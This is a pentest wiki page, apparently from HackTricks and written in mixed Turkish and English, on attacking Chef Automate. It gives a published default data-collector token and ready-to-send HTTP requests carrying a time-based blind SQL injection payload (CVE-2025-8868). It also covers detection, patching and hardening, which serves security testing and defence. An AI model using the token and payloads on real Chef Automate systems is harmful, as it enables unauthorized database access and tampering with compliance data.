# Chef Automate Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Bu sayfa Chef Automate örneklerini enumerate etmek ve saldırmak için pratik teknikleri toplar; özellikle:
- gRPC-Gateway-backed REST endpoints keşfetme ve validation/hata yanıtları aracılığıyla istek şemalarını çıkarma
- varsayılanlar mevcut olduğunda x-data-collector-token authentication header'ını kötüye kullanma
- /api/v0/compliance/profiles/search içindeki filters[].type alanını etkileyen Compliance API'de Time-based blind SQL injection (CVE-2025-8868)

> Not: Backend yanıtlarında grpc-metadata-content-type: application/grpc header'ının bulunması genellikle REST çağrılarını gRPC servislerine köprüleyen bir gRPC-Gateway olduğunu gösterir.

## Recon: Architecture and Fingerprints

- Front-end: Often Angular. Static bundle'lar REST yolları hakkında ipucu verebilir (ör. /api/v0/...)
- API transport: REST to gRPC via gRPC-Gateway
- Yanıtlar grpc-metadata-content-type: application/grpc içerebilir
- Database/driver fingerprints:
- Hata gövdeleri pq: ile başlıyorsa Go pq driver'ı kullanan PostgreSQL'i kuvvetle işaret eder
- İlginç Compliance endpoints (auth required):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate, istekleri özel bir header ile authenticate eden bir data collector sunar:

- Header: x-data-collector-token
- Risk: Bazı ortamlar, korumalı API yollarına erişim sağlayan varsayılan bir token'ı saklayabilir. Wild'da gözlemlenen bilinen varsayılan:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

Mevcutsa, bu token auth ile engellenmiş Compliance API endpoint'lerini çağırmak için kullanılabilir. Hardening sırasında varsayılanları döndürmeyi/devre dışı bırakmayı her zaman deneyin.

## API Schema Inference via Error-Driven Discovery

gRPC-Gateway-backed endpoints sıklıkla leak eden ve beklenen istek modelini tanımlayan yararlı doğrulama hataları gösterir.

For /api/v0/compliance/profiles/search, backend şu yapıda bir body bekler: filters dizisi, her eleman bir nesne olup:

- type: string (filter field identifier)
- values: array of strings

Örnek istek yapısı:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
Hatalı JSON veya yanlış alan tipleri genellikle ipuçlarıyla 4xx/5xx tetikler ve header'lar gRPC-Gateway davranışını gösterir. Bunları alanları eşlemek ve enjeksiyon yüzeylerini belirlemek için kullanın.

## Compliance API SQL Injection (CVE-2025-8868)

- Etkilenen endpoint: POST /api/v0/compliance/profiles/search
- Enjeksiyon noktası: filters[].type
- Vulnerability class: time-based blind SQL injection in PostgreSQL
- Kök neden: `type` alanını dinamik bir SQL fragment'ine interpolate ederken parameterization/whitelisting uygulanmaması (muhtemelen identifiers/WHERE clauses oluşturmak için kullanılıyor). `type` içindeki crafted değerler PostgreSQL tarafından değerlendirilir.

Working time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Teknik notlar:
- Orijinal string'i tek tırnak ile kapatın
- pg_sleep(N) çağıran bir subquery ile birleştirin
- || ile string bağlamına geri girin, böylece final SQL, type'ın gömülü olduğu her durumda söz dizimi açısından geçerli kalır

### Farklı gecikme ile doğrulama

Çift istek gönderin ve sunucu tarafı yürütmeyi doğrulamak için yanıt sürelerini karşılaştırın:

- N = 1 saniye
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 saniye
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Observed behavior:
- Yanıt süreleri pg_sleep(N) ile artıyor
- HTTP 500 yanıtları denemeler sırasında pq: detayları içerebilir; bu SQL yürütme yollarını doğrular

> İpucu: Gürültüyü ve false pozitifleri azaltmak için bir zamanlama doğrulayıcısı kullanın (ör. istatistiksel karşılaştırmalı birden fazla deneme).

### Etki

Kimlik doğrulanmış kullanıcılar — veya varsayılan x-data-collector-token'ı kötüye kullanan kimlik doğrulanmamış aktörler — Chef Automate’in PostgreSQL bağlamında rastgele SQL çalıştırabilir; bu, uyumluluk profilleri, yapılandırma ve telemetri gizliliği ile bütünlüğünü riske atar.

### Etkilenen sürümler / Düzeltme

- CVE: CVE-2025-8868
- Yükseltme yönlendirmesi: Satıcı bildirimlerine göre Chef Automate 4.13.295 veya daha yeni (Linux x86)

## Tespit ve Adli İnceleme

- API katmanı:
- /api/v0/compliance/profiles/search üzerindeki 500'leri izleyin; filters[].type içinde tırnak işaretleri ('), birleştirme (||) veya pg_sleep gibi fonksiyon referansları olup olmadığına bakın
- gRPC-Gateway akışlarını belirlemek için yanıt başlıklarında grpc-metadata-content-type'ı inceleyin
- Veritabanı katmanı (PostgreSQL):
- pg_sleep çağrılarını ve hatalı biçimlendirilmiş identifier hatalarını denetleyin (genellikle Go pq sürücüsünden gelen pq: önekleriyle ortaya çıkar)
- Kimlik Doğrulama:
- x-data-collector-token kullanımını, özellikle bilinen varsayılan değerleri, API yolları genelinde kaydedin ve uyarı verin

## Önlemler ve Sertleştirme

- Hemen:
- Varsayılan data collector token'larını değiştirin/devre dışı bırakın
- Data collector uç noktalarına gelen trafiği kısıtlayın; güçlü, benzersiz tokenlar zorunlu kılın
- Kod düzeyi:
- Sorguları parametreleyin; SQL parçalarını asla string ile birleştirmeyin
- Sunucuda izin verilen type değerlerini sıkı bir şekilde beyaz listeye alın (enum)
- Identifiers/clauses için dinamik SQL derlemesinden kaçının; dinamik davranış gerekiyorsa güvenli identifier tırnaklama ve açık beyaz listeler kullanın

## Pratik Test Kontrol Listesi

- x-data-collector-token'ın kabul edilip edilmediğini ve bilinen varsayılanın çalışıp çalışmadığını kontrol edin
- Doğrulama hataları oluşturarak ve hata mesajlarını/başlıkları okuyarak Compliance API istek şemasını haritalayın
- Sadece values dizileri veya üst düzey metin alanları değil, daha az belirgin "identifier-benzeri" alanlarda (ör. filters[].type) SQLi test edin
- Bağlamlar arasında SQL sözdizimini geçerli tutmak için birleştirme ile zaman tabanlı teknikler kullanın

## Referanslar

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
